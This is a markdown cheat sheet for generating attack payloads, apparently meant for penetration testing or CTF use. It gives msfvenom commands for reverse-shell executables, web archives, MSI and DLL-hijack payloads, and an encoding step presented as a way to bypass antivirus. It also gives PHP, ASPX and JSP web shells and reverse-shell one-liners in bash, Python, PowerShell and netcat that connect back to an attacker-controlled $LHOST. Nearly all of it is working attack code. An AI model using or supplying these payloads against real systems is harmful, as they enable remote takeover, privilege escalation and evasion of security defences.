# 🧪 Payload Generation

msfvenom payloads, web shells, and reverse shell one-liners.

---

## MSFVENOM

### Windows reverse shell (staged)

Staged payload — Smaller size, requires meterpreter handler

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe
```

---

### Windows reverse shell (stageless)

Self-contained payload — Works with nc listener, more reliable

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe
```

---

### Linux reverse shell

ELF binary — chmod +x and execute

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o shell.elf
```

---

### Java WAR (Tomcat)

Deploy via Tomcat manager — JSP reverse shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war
```

---

### ASP/ASPX (IIS)

Upload to IIS web root — Windows web servers

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f asp -o shell.asp
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f aspx -o shell.aspx
```

---

### PHP reverse shell

Upload or inject — Most common web shell format

```bash
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=4444 -o shell.php
```

---

### MSI installer (AlwaysInstallElevated)

Abuse misconfigured Windows policy — Runs as SYSTEM

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o shell.msi
# On target: msiexec /quiet /qn /i shell.msi
```

---

### DLL hijacking payload

Replace a DLL the service loads — Runs as service account

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o hijack.dll
```

---

### Encoding to bypass basic AV

Shikata_ga_nai encoder — Multiple iterations

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

---

## WEB SHELLS

### PHP one-liner

Simplest possible web shell — Upload or inject

```php
<?php system($_GET['cmd']); ?>
```

---

### PHP reverse shell (Pentest Monkey)

Full interactive reverse shell — Most reliable PHP shell

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Edit LHOST and LPORT in the file
# Upload and visit the URL to trigger
```

---

### ASPX web shell

For IIS servers — Upload to web root

```aspx
<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>
```

---

### JSP web shell

For Tomcat/Java servers — Deploy as WAR or upload directly

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

---

## REVERSE SHELL ONE-LINERS

### Bash

Most reliable on Linux — Try this first

```bash
bash -i >& /dev/tcp/$LHOST/4444 0>&1
```

---

### Python

Available on most Linux systems — Python 2 or 3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

### PowerShell

Windows reverse shell — Encode to bypass restrictions

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

### Netcat (with -e)

If nc has -e flag — Simple and reliable

```bash
nc -e /bin/bash $LHOST 4444
```

---

### Netcat (without -e)

FIFO pipe method — Works when nc doesn't have -e

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST 4444 >/tmp/f
```

---

## SHELL UPGRADES

### Upgrade to interactive TTY

First thing after catching a shell — Gives tab complete, Ctrl+C safety

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
```

---
